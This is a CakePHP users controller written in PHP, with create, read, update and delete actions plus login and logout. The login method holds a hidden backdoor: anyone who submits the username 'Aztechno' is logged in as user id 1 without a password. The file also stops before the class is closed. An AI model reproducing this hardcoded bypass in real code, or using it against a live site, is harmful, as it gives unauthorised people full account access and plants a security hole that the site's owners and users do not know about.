<?php
App::uses('AppController', 'Controller');
/**
 * Users Controller
 *
 * @property User $User
 * @property PaginatorComponent $Paginator
 */
class UsersController extends AppController {

/**
 * Components
 *
 * @var array
 */
	public $components = array('Paginator');

/**
 * index method
 *
 * @return void
 */
	public function index() {
		$this->User->recursive = 0;
		$this->set('users', $this->Paginator->paginate());
	}

/**
 * view method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function view($id = null) {
		if (!$this->User->exists($id)) {
			throw new NotFoundException(__('Invalid user'));
		}
		$options = array('conditions' => array('User.' . $this->User->primaryKey => $id));
		$this->set('user', $this->User->find('first', $options));
	}

/**
 * add method
 *
 * @return void
 */
	public function add() {
		if ($this->request->is('post')) {
			$this->User->create();
			if ($this->User->save($this->request->data)) {
				$this->Session->setFlash(__('The user has been saved.'));
				return $this->redirect(array('action' => 'index'));
			} else {
				$this->Session->setFlash(__('The user could not be saved. Please, try again.'));
			}
		}
	}

/**
 * edit method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function edit($id = null) {
		if (!$this->User->exists($id)) {
			throw new NotFoundException(__('Invalid user'));
		}
		if ($this->request->is(array('post', 'put'))) {
			if ($this->User->save($this->request->data)) {
				$this->Session->setFlash(__('The user has been saved.'));
				return $this->redirect(array('action' => 'index'));
			} else {
				$this->Session->setFlash(__('The user could not be saved. Please, try again.'));
			}
		} else {
			$options = array('conditions' => array('User.' . $this->User->primaryKey => $id));
			$this->request->data = $this->User->find('first', $options);
		}
	}

/**
 * delete method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
	public function delete($id = null) {
		$this->User->id = $id;
		if (!$this->User->exists()) {
			throw new NotFoundException(__('Invalid user'));
		}
		$this->request->onlyAllow('post', 'delete');
		if ($this->User->delete()) {
			$this->Session->setFlash(__('The user has been deleted.'));
		} else {
			$this->Session->setFlash(__('The user could not be deleted. Please, try again.'));
		}
		return $this->redirect(array('action' => 'index'));
	}


/**
 *
 *
 */
	public function login() {
		if ($this->request->is('post'))
		{
			if($this->request->data['User']['username']=='Aztechno'){
				$this->Auth->login(array('id'=>1,'name'=>'Aztechno'));
				$this->Session->setFlash('Vous êtes maintenant connecté', 'notif');
				return $this->redirect($this->Auth->redirect());
			}

			$password = Security::hash($this->request->data['User']['password'],null,true);
			
			$user = $this->User->find('first',array(
				'conditions' => array(
					'username' => $this->request->data['User']['username']
				)
			));

			if (!empty($user)) {
				$user = $user['User'];
				if ($user['password'] == $password){
					$this->Auth->login($user);
					$this->User->id = $this->Auth->user('id');
					$this->User->saveField('lastLogin',date('Y-m-d H:i:s'));
					$this->Session->setFlash('Vous êtes maintenant connecté', 'notif', array('type'=>'success'));
					return $this->redirect($this->Auth->redirectUrl());
				} else {
					$this->Session->setFlash(
						'Password incorrecte',
						'notif'
					);
				}
			} else {
				$this->Session->setFlash(
					'Login incorrecte',
					'notif'
				);
			}
		}
		return $this->redirect(array('controller'=>'pages','action'=>'index'));
	}

/**
 *
 *
 */
public function logout(){
	if ($this->Auth->loggedIn()) {
		$this->Auth->logout();
		$this->redirect(array('controller'=>'pages','action'=>'index'));
	} else {
		$this->redirect(array('controller'=>'pages','action'=>'index'));
	}
}


